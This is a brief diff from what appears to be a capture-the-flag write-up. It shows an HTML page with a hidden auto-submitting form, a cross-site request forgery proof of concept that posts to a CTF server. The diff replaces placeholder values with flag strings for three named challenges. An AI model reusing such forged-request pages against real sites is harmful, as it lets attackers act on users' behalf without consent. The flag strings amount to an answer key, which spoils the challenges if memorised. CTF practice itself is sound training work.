@@ -31,9 +31,9 @@ I guess monitoring the server doesnt cause a harm .. right?
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="https://ctf.sudoflaws.in/ip_giver.php" method="POST">
-      <input type="hidden" name="fname1" value="sudoflaws&#123;some&#95;text&#125;" />
-      <input type="hidden" name="fname2" value="sudoflaws&#123;some&#95;text&#125;" />
-      <input type="hidden" name="fname3" value="sudoflaws&#123;some&#95;text&#125;" />
+      <input type="hidden" name="fname1" value="sudoflaws{Flag of challenge SpaceWhite}" />
+      <input type="hidden" name="fname2" value="sudoflaws{Flag of challenge Signalling Wizard}" />
+      <input type="hidden" name="fname3" value="sudoflaws{Flag of challenge Alien Tech}" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
